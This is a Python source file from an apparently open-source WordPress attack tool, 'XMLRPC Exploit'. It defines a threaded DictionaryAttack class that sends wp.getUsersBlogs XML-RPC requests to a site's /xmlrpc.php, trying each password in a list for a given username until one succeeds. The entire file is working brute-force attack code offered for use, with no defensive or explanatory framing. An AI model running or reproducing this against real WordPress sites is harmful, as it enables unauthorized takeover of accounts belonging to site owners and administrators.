# XMLRPC Exploit
#
# Author : Relarizky
# Github : @relarizky (https://github.com/relarizky)
# File   : interface.py
# Last Modified : 11/28/20, 00:34 AM
#
# Copyright (c) 2020 Relarizky
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from tqdm import tqdm
from threading import Thread, Event
from requests.exceptions import RequestException
from wpxploit.xmlrpc.requester import XmlrpcRequester, XmlrpcDoesNotExist
from wpxploit.general.interface import current_time


class DictionaryAttack(XmlrpcRequester, Thread):

    _signal = Event()
    _result = None

    def __init__(self, url: str, user_name: str, pass_word: list, timeout: int):
        self.url = url
        self.user_name = user_name
        self.pass_word = pass_word
        Thread.__init__(self)
        XmlrpcRequester.__init__(self, url, timeout)

        if self._get_status is False:
            raise XmlrpcDoesNotExist("/xmlrpc.php seems to be unavailable")

    @staticmethod
    def _create_payload(user_name: str, pass_word: str) -> str:
        payload = "<methodCall>"
        payload += "<methodName>wp.getUsersBlogs</methodName>"
        payload += "<params>"
        payload += "<param><value>{}</value></param>".format(user_name)
        payload += "<param><value>{}</value></param>".format(pass_word)
        payload += "</params>"
        payload += "</methodCall>"

        return payload

    def perform_attack(self):
        progress_bar = tqdm(
            desc=current_time(),
            total=self.pass_word.__len__(),
            dynamic_ncols=True
        )
        for pass_word in self.pass_word:
            try:
                payload = self._create_payload(self.user_name, pass_word)
                request = self._make_xmlrpc_request(payload)
                progress_bar.update()
                if self._stopped():
                    # stop the loop in the thread
                    break
                else:
                    if request is not None:
                        self._result = {}
                        self._result.__setitem__("user_name", self.user_name)
                        self._result.__setitem__("pass_word", pass_word)
                        self.stop()
                        break
            except RequestException as Err:
                tqdm.write(current_time() + f" Connection error due to {Err}")
                break

        progress_bar.close()

    def run(self):
        self.perform_attack()

    def join(self):
        Thread.join(self)
        return self._result

    def stop(self):
        # set to true to inform all the threads to stop
        self._signal.set()

    def _stopped(self):
        return self._signal.is_set()
